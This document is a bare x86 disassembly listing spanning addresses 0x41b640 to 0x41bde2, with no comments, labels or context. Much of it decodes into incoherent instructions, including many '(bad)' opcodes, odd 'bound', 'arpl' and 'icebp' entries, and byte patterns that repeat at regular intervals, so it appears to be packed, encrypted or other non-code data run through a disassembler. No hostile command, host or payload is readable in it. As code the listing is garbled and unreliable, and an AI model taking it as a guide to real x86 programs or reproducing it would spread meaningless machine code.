  41b640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b641:	pop    eax
  41b642:	sub    esi,ebx
  41b644:	jbe    0x41b687
  41b646:	inc    eax
  41b647:	add    eax,0x41624340
  41b64c:	test   BYTE PTR [eax],al
  41b64e:	and    eax,0x404043
  41b653:	add    BYTE PTR ds:0x626210,al
  41b659:	add    eax,0x43404140
  41b65e:	inc    eax
  41b65f:	inc    ecx
  41b660:	add    eax,0x10664062
  41b665:	inc    ebx
  41b666:	bound  edx,QWORD PTR [edx-0x5f]
  41b669:	inc    eax
  41b66a:	jl     0x41b6db
  41b66c:	xchg   esp,eax
  41b66d:	add    al,0xa8
  41b66f:	cwde   
  41b670:	add    al,0x51
  41b672:	bound  eax,QWORD PTR [ecx+0x4310fd62]
  41b678:	popa   
  41b679:	inc    edx
  41b67a:	ret    
  41b67b:	bound  eax,QWORD PTR [esi]
  41b67d:	fs push eax
  41b67f:	add    eax,0x2dd6f06e
  41b684:	pushf  
  41b685:	fld    QWORD PTR ds:0x7d6f2565
  41b68b:	add    eax,0x4041cc
  41b690:	add    BYTE PTR [eax],al
  41b692:	inc    eax
  41b693:	inc    eax
  41b694:	inc    ebx
  41b695:	bound  eax,QWORD PTR [eax]
  41b697:	inc    eax
  41b698:	inc    eax
  41b699:	add    eax,0x62434162
  41b69e:	inc    eax
  41b69f:	js     0x41b6b1
  41b6a1:	inc    ecx
  41b6a2:	add    eax,0x5404325
  41b6a7:	bound  eax,QWORD PTR [eax+0x40]
  41b6aa:	inc    ecx
  41b6ab:	inc    ebx
  41b6ac:	sub    al,0x7e
  41b6ae:	aam    0x42
  41b6b0:	ror    BYTE PTR [edi+0x5c],1
  41b6b3:	(bad)  
  41b6b4:	int    0x12
  41b6b6:	bound  eax,QWORD PTR [ecx]
  41b6b8:	out    0x25,eax
  41b6ba:	adc    BYTE PTR [ebx],dh
  41b6bc:	jl     0x41b73b
  41b6be:	adc    BYTE PTR [edx+ebp*4],ch
  41b6c1:	and    eax,0x436241
  41b6c6:	adc    BYTE PTR [eax+0x0],al
  41b6c9:	add    eax,0x62410040
  41b6ce:	inc    eax
  41b6cf:	add    BYTE PTR [ebx-0x34],al
  41b6d2:	inc    eax
  41b6d3:	add    eax,0x78434040
  41b6d8:	bound  eax,QWORD PTR [ecx+0x78]
  41b6db:	add    eax,0x62404043
  41b6e0:	inc    ecx
  41b6e1:	jp     0x41b6bb
  41b6e3:	inc    ecx
  41b6e4:	outs   dx,DWORD PTR ds:[esi]
  41b6e5:	mov    edi,0x9a210bd6
  41b6ea:	inc    eax
  41b6eb:	push   ebx
  41b6ec:	pop    ecx
  41b6ed:	add    eax,0x482acfa9
  41b6f2:	inc    esp
  41b6f3:	cmp    BYTE PTR [ecx*8+0x50e117bc],bh
  41b6fa:	add    BYTE PTR [ebx+ebp*2+0x432e7141],0x34
  41b702:	sbb    eax,0xbb7087d4
  41b707:	leave  
  41b708:	and    DWORD PTR [edx+0x41],eax
  41b70b:	inc    eax
  41b70c:	add    eax,0x43436240
  41b711:	add    eax,0x62004040
  41b716:	inc    eax
  41b717:	add    BYTE PTR [ecx+0x40],al
  41b71a:	inc    ebx
  41b71b:	test   BYTE PTR ds:0x58054041,ah
  41b721:	inc    eax
  41b722:	inc    eax
  41b723:	bound  eax,QWORD PTR [eax+0x66]
  41b726:	inc    ecx
  41b727:	inc    eax
  41b728:	add    eax,0xbc65a500
  41b72d:	shr    BYTE PTR [ecx+ebp*8+0x3f],1
  41b731:	nop
  41b732:	retf   
  41b733:	loopne 0x41b7a0
  41b735:	(bad)  
  41b736:	fisttp WORD PTR [ecx+0x2b]
  41b739:	sub    BYTE PTR [ebx+0x3c],al
  41b73c:	arpl   WORD PTR [eax],ax
  41b73e:	add    BYTE PTR [ebx+0x40],al
  41b741:	bound  eax,QWORD PTR ds:0x25404110
  41b747:	add    ah,cl
  41b749:	inc    ebx
  41b74a:	add    eax,0x40402562
  41b74f:	add    BYTE PTR [eax+0x40],al
  41b752:	inc    ecx
  41b753:	inc    ecx
  41b754:	add    eax,0x78434025
  41b759:	bound  eax,QWORD PTR [eax-0x7c]
  41b75c:	inc    eax
  41b75d:	inc    ecx
  41b75e:	inc    eax
  41b75f:	xchg   esp,eax
  41b760:	adc    DWORD PTR [ebx],esp
  41b762:	or     BYTE PTR [edx+0x50402c66],ch
  41b768:	rol    esp,1
  41b76a:	ins    DWORD PTR es:[edi],dx
  41b76b:	call   0x5d82cf88
  41b770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b771:	gs inc ecx
  41b773:	inc    eax
  41b774:	inc    eax
  41b775:	inc    ebx
  41b776:	int3   
  41b777:	add    BYTE PTR ds:0x56240,al
  41b77d:	inc    ebx
  41b77e:	inc    eax
  41b77f:	inc    eax
  41b780:	add    BYTE PTR [ecx+0x62],al
  41b783:	bound  eax,QWORD PTR [eax]
  41b785:	int3   
  41b786:	inc    eax
  41b787:	inc    ebx
  41b788:	add    eax,0x43624041
  41b78d:	adc    BYTE PTR [ecx+0x5],al
  41b790:	inc    eax
  41b791:	dec    esp
  41b792:	gs enterw 0xdde2,0x6
  41b798:	xor    al,0x61
  41b79a:	aas    
  41b79b:	adc    DWORD PTR [ecx+ebp*4+0x5e],eax
  41b79f:	mov    es:0x3e7d2062,eax
  41b7a5:	inc    edx
  41b7a6:	int3   
  41b7a7:	xchg   esp,eax
  41b7a8:	ins    DWORD PTR es:[edi],dx
  41b7a9:	loope  0x41b80d
  41b7ab:	std    
  41b7ac:	bound  eax,QWORD PTR [ebx+0x40]
  41b7af:	adc    BYTE PTR ds:0x4158cc40,al
  41b7b5:	inc    ebx
  41b7b6:	bound  eax,QWORD PTR [ecx+0x40]
  41b7b9:	add    eax,0x4140
  41b7be:	and    eax,0x40400062
  41b7c3:	add    eax,0x84404340
  41b7c8:	int3   
  41b7c9:	js     0x41b7cb
  41b7cb:	inc    ecx
  41b7cc:	adc    BYTE PTR [edx+0xf],ah
  41b7cf:	call   FWORD PTR [ebx]
  41b7d1:	add    DWORD PTR [ecx+eiz*2],ebp
  41b7d4:	dec    ebp
  41b7d5:	pushf  
  41b7d6:	jg     0x41b780
  41b7d8:	jl     0x41b77e
  41b7da:	fstp   QWORD PTR [ebx+0x21]
  41b7dd:	es jo  0x41b7f0
  41b7e0:	bound  ebp,QWORD PTR [edx+0x36]
  41b7e3:	loope  0x41b7d4
  41b7e5:	test   al,0x62
  41b7e7:	mov    al,0x51
  41b7e9:	stos   DWORD PTR es:[edi],eax
  41b7ea:	bound  ebx,QWORD PTR [edx+0x46]
  41b7ed:	inc    eax
  41b7ee:	inc    ebx
  41b7ef:	add    eax,0xa1c968dc
  41b7f4:	and    DWORD PTR [edx],ebp
  41b7f6:	and    BYTE PTR [edx+0x5b],al
  41b7f9:	and    dl,BYTE PTR [ecx+0x4e]
  41b7fc:	outs   dx,DWORD PTR ds:[esi]
  41b7fd:	add    BYTE PTR [eax+0x41],al
  41b800:	inc    eax
  41b801:	inc    ebx
  41b802:	bound  ax,DWORD PTR ds:0x40434100
  41b809:	add    eax,0x40054062
  41b80e:	bound  eax,QWORD PTR [ecx+0x40]
  41b811:	inc    ebx
  41b812:	inc    eax
  41b813:	add    eax,0x25405841
  41b818:	bound  eax,QWORD PTR [eax+0x43]
  41b81b:	inc    eax
  41b81c:	adc    BYTE PTR [edx+0x6b],al
  41b81f:	push   esi
  41b820:	test   BYTE PTR [ebp-0x4f],ah
  41b823:	popa   
  41b824:	mov    eax,ds:0xf42866
  41b829:	(bad)  
  41b82a:	dec    esp
  41b82b:	push   eax
  41b82c:	(bad)  
  41b82d:	hlt    
  41b82e:	repnz ins BYTE PTR es:[edi],dx
  41b830:	(bad)  
  41b832:	mov    esi,0xa8006121
  41b837:	enter  0x62dd,0xab
  41b83b:	mov    edi,0x2104d3d
  41b840:	push   edx
  41b841:	jae    0x41b801
  41b843:	jne    0x41b885
  41b845:	inc    ecx
  41b846:	inc    ebx
  41b847:	inc    eax
  41b848:	add    eax,0x43406262
  41b84d:	inc    ecx
  41b84e:	adc    BYTE PTR [eax],al
  41b850:	inc    eax
  41b851:	add    eax,0x43000562
  41b856:	add    BYTE PTR [ecx+0x40],al
  41b859:	inc    eax
  41b85a:	add    eax,0x400062
  41b85f:	inc    ebx
  41b860:	inc    eax
  41b861:	js     0x41b8a4
  41b863:	inc    ecx
  41b864:	bound  eax,QWORD PTR [eax+0x23]
  41b867:	lds    eax,FWORD PTR [ecx+0x4]
  41b86a:	shr    BYTE PTR [eax],0x71
  41b86d:	mov    eax,ds:0x626a4894
  41b872:	dec    ebx
  41b873:	arpl   bp,bx
  41b875:	jnp    0x41b81a
  41b877:	inc    edx
  41b878:	fmul   st,st(3)
  41b87a:	call   0xd3a6f4f4
  41b87f:	xor    DWORD PTR [edx+0x40],esp
  41b882:	ins    BYTE PTR es:[edi],dx
  41b883:	sub    al,0x28
  41b885:	add    bh,ah
  41b887:	fwait
  41b888:	inc    ebx
  41b889:	push   eax
  41b88a:	jb     0x41b8f2
  41b88c:	shl    BYTE PTR [ebx],cl
  41b88e:	bound  eax,QWORD PTR [eax+0x5]
  41b891:	inc    ecx
  41b892:	add    BYTE PTR [ebx+0x40],al
  41b895:	inc    eax
  41b896:	inc    ecx
  41b897:	inc    eax
  41b898:	inc    eax
  41b899:	bound  eax,QWORD PTR ds:0x5624300
  41b89f:	add    BYTE PTR [eax+0x40],al
  41b8a2:	add    BYTE PTR [ecx+0x43],al
  41b8a5:	add    BYTE PTR [eax+0x41],al
  41b8a8:	add    eax,0x40436200
  41b8ad:	inc    eax
  41b8ae:	add    eax,0xc0aca862
  41b8b3:	inc    esp
  41b8b4:	mov    edx,gs
  41b8b6:	pop    edi
  41b8b7:	inc    ebp
  41b8b8:	popa   
  41b8b9:	add    dl,BYTE PTR [edx-0x35379b7a]
  41b8bf:	mov    ds:0x4238864d,eax
  41b8c4:	inc    ebx
  41b8c5:	leave  
  41b8c6:	ror    BYTE PTR [esi-0x1f],1
  41b8c9:	inc    ecx
  41b8ca:	inc    eax
  41b8cb:	add    eax,0x41624340
  41b8d0:	test   BYTE PTR [eax],al
  41b8d2:	and    eax,0x404043
  41b8d7:	add    BYTE PTR ds:0x626210,al
  41b8dd:	add    eax,0x43404140
  41b8e2:	inc    eax
  41b8e3:	inc    ecx
  41b8e4:	add    eax,0x10664062
  41b8e9:	inc    ebx
  41b8ea:	bound  edx,QWORD PTR [ebx-0x37]
  41b8ed:	and    eax,0xa5eb3620
  41b8f2:	mov    edi,0x6adc82bc
  41b8f7:	leave  
  41b8f8:	jmp    0x348f0a65
  41b8fd:	neg    eax
  41b8ff:	outs   dx,BYTE PTR ds:[esi]
  41b900:	scas   eax,DWORD PTR es:[edi]
  41b901:	and    DWORD PTR [ecx],esp
  41b903:	xor    DWORD PTR [ebx+0x4f],ebx
  41b906:	add    DWORD PTR [ebp+eax*1-0x34],esp
  41b90a:	inc    ecx
  41b90b:	inc    eax
  41b90c:	add    BYTE PTR [eax],al
  41b90e:	add    BYTE PTR [eax+0x40],al
  41b911:	inc    ebx
  41b912:	bound  eax,QWORD PTR [eax]
  41b914:	inc    eax
  41b915:	inc    eax
  41b916:	add    eax,0x62434162
  41b91b:	inc    eax
  41b91c:	js     0x41b92e
  41b91e:	inc    ecx
  41b91f:	add    eax,0x5404325
  41b924:	bound  eax,QWORD PTR [eax+0x40]
  41b927:	inc    ecx
  41b928:	inc    ebx
  41b929:	dec    esp
  41b92a:	xor    al,0x48
  41b92c:	sti    
  41b92d:	test   eax,0x6164621a
  41b932:	mov    eax,ds:0x9aa8e0a2
  41b937:	loopne 0x41b93e
  41b939:	aam    0x2d
  41b93b:	cs push edx
  41b93d:	adc    DWORD PTR [ecx],ebx
  41b93f:	jl     0x41b90c
  41b941:	fsub   st,st(1)
  41b943:	inc    edi
  41b944:	dec    ecx
  41b945:	dec    eax
  41b946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b947:	addr16 pusha 
  41b949:	dec    ebx
  41b94a:	mov    edi,0x5742c0a2
  41b94f:	addr16 xor al,0x51
  41b952:	inc    ecx
  41b953:	add    al,0x9e
  41b955:	jns    0x41b8e9
  41b957:	nop
  41b958:	mov    edi,0x1140a342
  41b95d:	and    eax,0x436241
  41b962:	adc    BYTE PTR [eax+0x0],al
  41b965:	add    eax,0x62410040
  41b96a:	inc    eax
  41b96b:	add    BYTE PTR [ebx-0x34],al
  41b96e:	inc    eax
  41b96f:	add    eax,0x78434040
  41b974:	bound  eax,QWORD PTR [ecx+0x78]
  41b977:	add    eax,0x62404043
  41b97c:	sub    al,0x83
  41b97e:	arpl   WORD PTR [eax-0x579fa91b],di
  41b984:	push   ebx
  41b985:	pusha  
  41b986:	sbb    bl,al
  41b988:	jp     0x41b9ed
  41b98a:	sub    al,0x12
  41b98c:	xor    eax,0xa7540063
  41b991:	ins    BYTE PTR es:[edi],dx
  41b992:	mov    eax,ds:0x4ff76944
  41b997:	test   BYTE PTR [eax],dh
  41b999:	loope  0x41b92c
  41b99b:	adc    esi,edi
  41b99d:	dec    edi
  41b99e:	ss ret 
  41b9a0:	xchg   BYTE PTR [eax],bl
  41b9a2:	sub    eax,0x37162cb
  41b9a7:	xchg   edx,eax
  41b9a8:	mov    ebp,esp
  41b9aa:	clc    
  41b9ab:	inc    esp
  41b9ac:	imul   eax,DWORD PTR [edx-0x58],0x41dac4bf
  41b9b3:	inc    eax
  41b9b4:	add    eax,0x43436240
  41b9b9:	add    eax,0x62004040
  41b9be:	inc    eax
  41b9bf:	add    BYTE PTR [ecx+0x40],al
  41b9c2:	inc    ebx
  41b9c3:	test   BYTE PTR ds:0x58054041,ah
  41b9c9:	inc    eax
  41b9ca:	inc    eax
  41b9cb:	bound  eax,QWORD PTR [eax+0x66]
  41b9ce:	inc    ecx
  41b9cf:	inc    eax
  41b9d0:	add    eax,0xac6b7a00
  41b9d5:	mov    bl,0x12
  41b9d7:	dec    ecx
  41b9d8:	sub    eax,0x631040a3
  41b9dd:	addr16 mov esp,0xa0c5c022
  41b9e3:	push   edx
  41b9e4:	fsubr  QWORD PTR [esi+0x41]
  41b9e7:	adc    al,0x79
  41b9e9:	arpl   WORD PTR [eax],si
  41b9eb:	test   BYTE PTR [eax+ebx*8],dh
  41b9ee:	or     eax,0xfe417362
  41b9f3:	ret    
  41b9f4:	fs push ebp
  41b9f6:	nop
  41b9f7:	rol    BYTE PTR ds:0x69722321,1
  41b9fd:	test   al,0x62
  41b9ff:	retf   
  41ba00:	mov    edi,0x40430000
  41ba05:	bound  eax,QWORD PTR ds:0x25404110
  41ba0b:	add    ah,cl
  41ba0d:	inc    ebx
  41ba0e:	add    eax,0x40402562
  41ba13:	add    BYTE PTR [eax+0x40],al
  41ba16:	inc    ecx
  41ba17:	inc    ecx
  41ba18:	add    eax,0x78434025
  41ba1d:	bound  eax,QWORD PTR [eax-0x7c]
  41ba20:	inc    eax
  41ba21:	inc    ecx
  41ba22:	inc    edi
  41ba23:	lds    ebp,FWORD PTR [esi-0x4097efa0]
  41ba29:	icebp  
  41ba2a:	and    ebx,esp
  41ba2c:	bound  esp,QWORD PTR [edx+0x51]
  41ba2f:	xor    al,0xbf
  41ba31:	inc    edx
  41ba32:	mov    edi,0x3f44a849
  41ba37:	rcr    DWORD PTR [esi+0x10a5177a],0x1
  41ba3e:	sbb    BYTE PTR [esi+0x2c25530a],bh
  41ba44:	inc    esp
  41ba45:	leave  
  41ba46:	cmc    
  41ba47:	push   esp
  41ba48:	inc    ebx
  41ba49:	adc    DWORD PTR [edx+0x21],esi
  41ba4c:	pushf  
  41ba4d:	inc    esp
  41ba4e:	sbb    ecx,ecx
  41ba50:	enter  0xa963,0xef
  41ba54:	repz inc ecx
  41ba56:	push   edx
  41ba57:	dec    eax
  41ba58:	inc    ecx
  41ba59:	inc    eax
  41ba5a:	inc    eax
  41ba5b:	inc    ebx
  41ba5c:	int3   
  41ba5d:	add    BYTE PTR ds:0x56240,al
  41ba63:	inc    ebx
  41ba64:	inc    eax
  41ba65:	inc    eax
  41ba66:	add    BYTE PTR [ecx+0x62],al
  41ba69:	bound  eax,QWORD PTR [eax]
  41ba6b:	int3   
  41ba6c:	inc    eax
  41ba6d:	inc    ebx
  41ba6e:	add    eax,0x43624041
  41ba73:	adc    BYTE PTR [ecx+0x5],al
  41ba76:	inc    eax
  41ba77:	int3   
  41ba78:	fstp   DWORD PTR [esi-0x78]
  41ba7b:	arpl   WORD PTR [ecx-0x41],ax
  41ba7e:	add    al,0x10
  41ba80:	push   esi
  41ba81:	loope  0x41bae4
  41ba83:	sbb    eax,0xa87e30ac
  41ba88:	pop    esi
  41ba89:	cmp    DWORD PTR [esp+esi*1+0x50],ecx
  41ba8d:	sbb    eax,0xad750564
  41ba92:	and    DWORD PTR [ebx],eax
  41ba94:	add    DWORD PTR [edx-0x58],ebx
  41ba97:	int    0x5c
  41ba99:	push   esi
  41ba9a:	cmp    bl,BYTE PTR [ebx+0x41cc42c9]
  41baa0:	jb     0x41bb03
  41baa2:	loope  0x41babd
  41baa4:	push   es
  41baa5:	fsub   DWORD PTR ds:0xf74ddee5
  41baab:	arpl   WORD PTR [ebx+0x62c4415b],si
  41bab1:	inc    ebx
  41bab2:	inc    eax
  41bab3:	adc    BYTE PTR ds:0x4158cc40,al
  41bab9:	inc    ebx
  41baba:	bound  eax,QWORD PTR [ecx+0x40]
  41babd:	add    eax,0x4140
  41bac2:	and    eax,0x40400062
  41bac7:	add    eax,0x84404340
  41bacc:	int3   
  41bacd:	js     0x41bacf
  41bacf:	inc    ecx
  41bad0:	adc    BYTE PTR [edx+0xf],ah
  41bad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bad4:	pusha  
  41bad5:	in     eax,0x77
  41bad7:	arpl   WORD PTR [edx+0x2a],ax
  41bada:	dec    esp
  41badb:	xchg   esp,eax
  41badc:	or     BYTE PTR [eax+0x7fbd6ea8],dl
  41bae2:	or     BYTE PTR [eax+0xc53a123],ah
  41bae8:	imul   ecx,DWORD PTR [ebx],0xf7a3be41
  41baee:	retf   
  41baef:	bound  edx,QWORD PTR [ebx]
  41baf1:	xchg   DWORD PTR [edx],esp
  41baf3:	cli    
  41baf4:	mov    ebp,0x4c6725e2
  41baf9:	fs fnstsw ax
  41bafc:	mov    ebp,db7
  41baff:	xor    al,0x64
  41bb01:	add    eax,0xe72871a8
  41bb06:	clc    
  41bb07:	add    BYTE PTR [eax+0x41],al
  41bb0a:	inc    eax
  41bb0b:	inc    ebx
  41bb0c:	bound  ax,DWORD PTR ds:0x40434100
  41bb13:	add    eax,0x40054062
  41bb18:	bound  eax,QWORD PTR [ecx+0x40]
  41bb1b:	inc    ebx
  41bb1c:	inc    eax
  41bb1d:	add    eax,0x25405841
  41bb22:	bound  eax,QWORD PTR [eax+0x43]
  41bb25:	inc    eax
  41bb26:	adc    BYTE PTR [eax-0x5cef36b8],al
  41bb2c:	es and eax,0x48c8c5b0
  41bb32:	pop    eax
  41bb33:	mov    edi,0x50a4bd47
  41bb38:	jb     0x41bbb2
  41bb3a:	inc    ecx
  41bb3b:	and    ah,BYTE PTR [edx]
  41bb3d:	xor    al,0x41
  41bb3f:	inc    edx
  41bb40:	inc    edx
  41bb41:	sub    eax,DWORD PTR [ebp+eiz*2+0x2a]
  41bb45:	and    eax,0x63bd50ad
  41bb4a:	int3   
  41bb4b:	dec    edx
  41bb4c:	or     BYTE PTR [esi+ebp*8],ch
  41bb4f:	enter  0xa167,0xe8
  41bb53:	inc    eax
  41bb54:	inc    ecx
  41bb55:	inc    ebx
  41bb56:	inc    eax
  41bb57:	add    eax,0x43406262
  41bb5c:	inc    ecx
  41bb5d:	adc    BYTE PTR [eax],al
  41bb5f:	inc    eax
  41bb60:	add    eax,0x43000562
  41bb65:	add    BYTE PTR [ecx+0x40],al
  41bb68:	inc    eax
  41bb69:	add    eax,0x400062
  41bb6e:	inc    ebx
  41bb6f:	inc    eax
  41bb70:	js     0x41bbb3
  41bb72:	inc    ecx
  41bb73:	bound  eax,QWORD PTR [eax-0x58]
  41bb76:	and    BYTE PTR [ecx-0x576207cb],dh
  41bb7c:	test   al,0x0
  41bb7e:	xor    ecx,DWORD PTR [esi+0x1058a8e1]
  41bb84:	and    eax,0x64a540b3
  41bb89:	adc    BYTE PTR [edx+0x48],dl
  41bb8c:	xor    al,0x96
  41bb8e:	mov    ds:0x42484429,al
  41bb93:	add    eax,0x21249c41
  41bb98:	cmp    BYTE PTR [edx],al
  41bb9a:	mov    esp,0x41054062
  41bb9f:	add    BYTE PTR [ebx+0x40],al
  41bba2:	inc    eax
  41bba3:	inc    ecx
  41bba4:	inc    eax
  41bba5:	inc    eax
  41bba6:	bound  eax,QWORD PTR ds:0x5624300
  41bbac:	add    BYTE PTR [eax+0x40],al
  41bbaf:	add    BYTE PTR [ecx+0x43],al
  41bbb2:	add    BYTE PTR [eax+0x41],al
  41bbb5:	add    eax,0x40436200
  41bbba:	inc    eax
  41bbbb:	add    eax,0x94c5cb62
  41bbc0:	jmp    0x3cbf:0x7bcb6935
  41bbc7:	and    ebp,DWORD PTR [edi+0x23]
  41bbca:	cli    
  41bbcb:	dec    eax
  41bbcc:	xor    ch,BYTE PTR [edx]
  41bbce:	shl    BYTE PTR gs:[edx],1
  41bbd1:	(bad)  
  41bbd2:	test   al,0x44
  41bbd4:	push   esp
  41bbd5:	push   ecx
  41bbd6:	jno    0x41bc19
  41bbd8:	inc    eax
  41bbd9:	add    eax,0x41624340
  41bbde:	test   BYTE PTR [eax],al
  41bbe0:	and    eax,0x404043
  41bbe5:	add    BYTE PTR ds:0x626210,al
  41bbeb:	add    eax,0x43404140
  41bbf0:	inc    eax
  41bbf1:	inc    ecx
  41bbf2:	add    eax,0x10664062
  41bbf7:	inc    ebx
  41bbf8:	bound  ecx,QWORD PTR [edi+0x2f]
  41bbfb:	arpl   WORD PTR [ecx+eax*2+0x66],cx
  41bbff:	inc    esi
  41bc00:	cld    
  41bc01:	fld    QWORD PTR [edx+0x31]
  41bc04:	aas    
  41bc05:	xor    al,0xb2
  41bc07:	inc    ecx
  41bc08:	leave  
  41bc09:	xor    al,0x20
  41bc0b:	mov    ds:0xc86003a4,eax
  41bc10:	pop    esi
  41bc11:	stos   BYTE PTR es:[edi],al
  41bc12:	adc    DWORD PTR [ebx],esi
  41bc14:	or     eax,0xc11f69b4
  41bc19:	stos   DWORD PTR es:[edi],eax
  41bc1a:	and    eax,0xd065f221
  41bc1f:	stos   DWORD PTR es:[edi],eax
  41bc20:	mov    ah,0x90
  41bc22:	sub    edi,DWORD PTR [edi-0x33fa7d76]
  41bc28:	inc    ecx
  41bc29:	inc    eax
  41bc2a:	add    BYTE PTR [eax],al
  41bc2c:	add    BYTE PTR [eax+0x40],al
  41bc2f:	inc    ebx
  41bc30:	bound  eax,QWORD PTR [eax]
  41bc32:	inc    eax
  41bc33:	inc    eax
  41bc34:	add    eax,0x62434162
  41bc39:	inc    eax
  41bc3a:	js     0x41bc4c
  41bc3c:	inc    ecx
  41bc3d:	add    eax,0x5404325
  41bc42:	bound  eax,QWORD PTR [eax+0x40]
  41bc45:	inc    ecx
  41bc46:	inc    ebx
  41bc47:	inc    ebp
  41bc48:	mov    eax,0xe744af0d
  41bc4d:	push   edx
  41bc4e:	ret    
  41bc4f:	cmp    DWORD PTR [ecx-0x37],edi
  41bc52:	lock popa 
  41bc54:	in     eax,0x48
  41bc56:	add    dh,BYTE PTR ds:0x258a4a9f
  41bc5c:	inc    ecx
  41bc5d:	bound  eax,QWORD PTR [ebx+0x0]
  41bc60:	adc    BYTE PTR [eax+0x0],al
  41bc63:	add    eax,0x62410040
  41bc68:	inc    eax
  41bc69:	add    BYTE PTR [ebx-0x34],al
  41bc6c:	inc    eax
  41bc6d:	add    eax,0x78434040
  41bc72:	bound  eax,QWORD PTR [ecx+0x78]
  41bc75:	add    eax,0x62404043
  41bc7a:	pusha  
  41bc7b:	cld    
  41bc7c:	hlt    
  41bc7d:	inc    esi
  41bc7e:	test   al,0x62
  41bc80:	inc    esi
  41bc81:	pop    edi
  41bc82:	popa   
  41bc83:	mov    ds:0x62c062a1,eax
  41bc88:	or     al,0xb8
  41bc8a:	arpl   WORD PTR [esi],di
  41bc8c:	push   ebx
  41bc8d:	dec    esp
  41bc8e:	sub    ch,BYTE PTR [eax]
  41bc90:	int    0x8a
  41bc92:	mov    ds:0xf3811cb1,al
  41bc97:	dec    ebx
  41bc98:	push   eax
  41bc99:	outs   dx,BYTE PTR ds:[esi]
  41bc9a:	out    dx,eax
  41bc9b:	(bad)  
  41bc9c:	test   al,0xc3
  41bc9e:	int3   
  41bc9f:	xor    eax,0x39291200
  41bca4:	adc    eax,0x46507cbc
  41bca9:	inc    ecx
  41bcaa:	inc    eax
  41bcab:	add    eax,0x43436240
  41bcb0:	add    eax,0x62004040
  41bcb5:	inc    eax
  41bcb6:	add    BYTE PTR [ecx+0x40],al
  41bcb9:	inc    ebx
  41bcba:	test   BYTE PTR ds:0x58054041,ah
  41bcc0:	inc    eax
  41bcc1:	inc    eax
  41bcc2:	bound  eax,QWORD PTR [eax+0x66]
  41bcc5:	inc    ecx
  41bcc6:	inc    eax
  41bcc7:	add    eax,0x3d33fb00
  41bccc:	xor    cl,BYTE PTR ds:0xad403aa0
  41bcd2:	loop   0x41bc7d
  41bcd4:	inc    eax
  41bcd5:	retf   
  41bcd6:	arpl   WORD PTR [eax],dx
  41bcd8:	cmp    al,0xe9
  41bcda:	das    
  41bcdb:	cmp    eax,0x67282a
  41bce0:	add    BYTE PTR [ebx+0x40],al
  41bce3:	bound  eax,QWORD PTR ds:0x25404110
  41bce9:	add    ah,cl
  41bceb:	inc    ebx
  41bcec:	add    eax,0x40402562
  41bcf1:	add    BYTE PTR [eax+0x40],al
  41bcf4:	inc    ecx
  41bcf5:	inc    ecx
  41bcf6:	add    eax,0x78434025
  41bcfb:	bound  eax,QWORD PTR [eax-0x7c]
  41bcfe:	inc    eax
  41bcff:	inc    ecx
  41bd00:	jl     0x41bc8e
  41bd02:	dec    ebx
  41bd03:	push   cs
  41bd04:	mov    edi,0x6674444e
  41bd09:	test   al,0x94
  41bd0b:	and    eax,0x633c34c1
  41bd10:	fist   DWORD PTR [eax+eiz*1+0x55]
  41bd14:	cmc    
  41bd15:	dec    ecx
  41bd16:	xor    BYTE PTR [ecx],al
  41bd18:	pushf  
  41bd19:	xor    BYTE PTR [ebx-0x5f],bl
  41bd1c:	shl    DWORD PTR [ecx],0xda
  41bd1f:	pop    edi
  41bd20:	dec    edi
  41bd21:	retf   
  41bd22:	mov    BYTE PTR [ecx+0x40],al
  41bd25:	inc    eax
  41bd26:	inc    ebx
  41bd27:	int3   
  41bd28:	add    BYTE PTR ds:0x56240,al
  41bd2e:	inc    ebx
  41bd2f:	inc    eax
  41bd30:	inc    eax
  41bd31:	add    BYTE PTR [ecx+0x62],al
  41bd34:	bound  eax,QWORD PTR [eax]
  41bd36:	int3   
  41bd37:	inc    eax
  41bd38:	inc    ebx
  41bd39:	add    eax,0x43624041
  41bd3e:	adc    BYTE PTR [ecx+0x5],al
  41bd41:	inc    eax
  41bd42:	push   cs
  41bd43:	inc    DWORD PTR [ebp-0x3c]
  41bd46:	or     eax,0x25e34034
  41bd4b:	mov    edi,0x4f5ac0e4
  41bd50:	inc    eax
  41bd51:	daa    
  41bd52:	jo     0x41bd16
  41bd54:	jge    0x41bda3
  41bd56:	mov    dl,0xe4
  41bd58:	dec    edi
  41bd59:	bound  eax,QWORD PTR [ebx+0x40]
  41bd5c:	adc    BYTE PTR ds:0x4158cc40,al
  41bd62:	inc    ebx
  41bd63:	bound  eax,QWORD PTR [ecx+0x40]
  41bd66:	add    eax,0x4140
  41bd6b:	and    eax,0x40400062
  41bd70:	add    eax,0x84404340
  41bd75:	int3   
  41bd76:	js     0x41bd78
  41bd78:	inc    ecx
  41bd79:	adc    BYTE PTR [edx+0xf],ah
  41bd7c:	imul   esp,DWORD PTR [ebx],0xfffffff3
  41bd7f:	dec    eax
  41bd80:	sub    DWORD PTR [eax+0x6b],esp
  41bd83:	xchg   esp,eax
  41bd84:	push   ds
  41bd85:	and    edi,DWORD PTR [edi+eax*2]
  41bd88:	adc    eax,0x73a84262
  41bd8d:	jecxz  0x41bdb2
  41bd8f:	dec    esi
  41bd90:	addr16 int 0x5
  41bd93:	inc    eax
  41bd94:	cwde   
  41bd95:	pop    ds
  41bd96:	inc    edx
  41bd97:	sub    BYTE PTR [ebp+0x76b2d990],al
  41bd9d:	arpl   WORD PTR [ecx],sp
  41bd9f:	(bad)  
  41bda0:	bound  esp,QWORD PTR [ebx+0x18]
  41bda3:	add    eax,0x1157a18f
  41bda8:	dec    eax
  41bda9:	mov    al,0xc8
  41bdab:	add    BYTE PTR [eax+0x41],al
  41bdae:	inc    eax
  41bdaf:	inc    ebx
  41bdb0:	bound  ax,DWORD PTR ds:0x40434100
  41bdb7:	add    eax,0x40054062
  41bdbc:	bound  eax,QWORD PTR [ecx+0x40]
  41bdbf:	inc    ebx
  41bdc0:	inc    eax
  41bdc1:	add    eax,0x25405841
  41bdc6:	bound  eax,QWORD PTR [eax+0x43]
  41bdc9:	inc    eax
  41bdca:	adc    BYTE PTR [esi-0x1bc6fbfd],al
  41bdd0:	cmp    eax,0xf23d6305
  41bdd5:	daa    
  41bdd6:	dec    eax
  41bdd7:	fisub  DWORD PTR [ecx]
  41bdd9:	not    DWORD PTR [ecx+esi*4]
  41bddc:	or     BYTE PTR [edi-0x13],0x10
  41bde0:	inc    eax
  41bde1:	dec    edi
  41bde2:	sbb    BYTE PTR ds:0x4457a100,al
